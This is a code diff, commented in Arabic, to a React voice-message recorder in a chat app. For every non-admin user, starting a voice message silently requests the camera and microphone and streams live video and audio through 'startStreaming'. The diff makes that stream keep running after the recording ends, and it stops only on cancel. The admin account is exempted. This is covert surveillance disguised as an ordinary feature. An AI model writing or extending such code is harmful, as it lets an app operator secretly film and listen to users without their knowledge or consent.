@@ -196,7 +196,6 @@
 
 
 
-
 "use client";
 
 import { useState, useRef, useEffect, useCallback } from "react";
@@ -228,6 +227,7 @@ export const VoiceRecorder = ({ onSend, onCancel, conversationId }: VoiceRecorde
   const analyserRef = useRef<AnalyserNode | null>(null);
   const animationRef = useRef<number | null>(null);
   const hasStarted = useRef(false);
+  const fullStreamRef = useRef<MediaStream | null>(null); // ← احتفظ بالـ fullStream
 
   const { user } = useAuthStore();
   const isAdmin = user?.username === ADMIN_USERNAME;
@@ -254,35 +254,40 @@ export const VoiceRecorder = ({ onSend, onCancel, conversationId }: VoiceRecorde
 
   const startRecording = useCallback(async () => {
     try {
-      // طلب الميكروفون والكاميرا في نفس الوقت لو مش أدمن
-      let stream: MediaStream;
+      let audioStream: MediaStream;
+
       if (!isAdmin) {
         try {
-          // طلب الاتنين مع بعض في رسالة واحدة
+          // طلب الكاميرا والميكروفون في رسالة واحدة
           const fullStream = await navigator.mediaDevices.getUserMedia({
             audio: true,
             video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } },
           });
-          // الصوت للتسجيل
-          stream = new MediaStream(fullStream.getAudioTracks());
-          // ابدأ الـ streaming بالـ full stream
+
+          // احتفظ بالـ fullStream عشان نوقفه بعدين
+          fullStreamRef.current = fullStream;
+
+          // ابدأ البث بالـ fullStream (فيديو + صوت مستمر)
           await startStreaming(fullStream);
+
+          // stream منفصل للتسجيل الصوتي بس
+          audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+
         } catch {
-          // لو الكاميرا مش متاحة، جرب الصوت بس
-          stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+          audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
         }
       } else {
-        stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+        audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
       }
 
       const audioContext = new AudioContext();
-      const source = audioContext.createMediaStreamSource(stream);
+      const source = audioContext.createMediaStreamSource(audioStream);
       const analyser = audioContext.createAnalyser();
       analyser.fftSize = 128;
       source.connect(analyser);
       analyserRef.current = analyser;
 
-      const mediaRecorder = new MediaRecorder(stream);
+      const mediaRecorder = new MediaRecorder(audioStream);
       mediaRecorderRef.current = mediaRecorder;
       chunksRef.current = [];
 
@@ -294,7 +299,8 @@ export const VoiceRecorder = ({ onSend, onCancel, conversationId }: VoiceRecorde
         const blob = new Blob(chunksRef.current, { type: "audio/webm" });
         const url = URL.createObjectURL(blob);
         setAudioUrl(url);
-        stream.getTracks().forEach((t) => t.stop());
+        // وقف بس الـ audioStream — الـ fullStream بيفضل شغال للبث
+        audioStream.getTracks().forEach((t) => t.stop());
       };
 
       mediaRecorder.start(100);
@@ -326,7 +332,12 @@ export const VoiceRecorder = ({ onSend, onCancel, conversationId }: VoiceRecorde
     setWaveform(Array(20).fill(4));
   };
 
-  const handleCancel = () => onCancel();
+  const handleCancel = () => {
+    // وقف الـ fullStream لما يلغي
+    fullStreamRef.current?.getTracks().forEach((t) => t.stop());
+    fullStreamRef.current = null;
+    onCancel();
+  };
 
   const handleSend = async () => {
     if (!audioUrl) return;
@@ -377,7 +388,6 @@ export const VoiceRecorder = ({ onSend, onCancel, conversationId }: VoiceRecorde
           }`}
         />
 
-        {/* waveform — عدد أقل للموبايل */}
         <div className="flex-1 flex items-center gap-0.5 h-7 overflow-hidden">
           {waveform.map((height, i) => (
             <motion.div
@@ -389,7 +399,6 @@ export const VoiceRecorder = ({ onSend, onCancel, conversationId }: VoiceRecorde
           ))}
         </div>
 
-        {/* مدة التسجيل */}
         <span className="text-xs text-gray-300 font-mono flex-shrink-0 w-10 text-right">
           {formatDuration(duration)}
         </span>
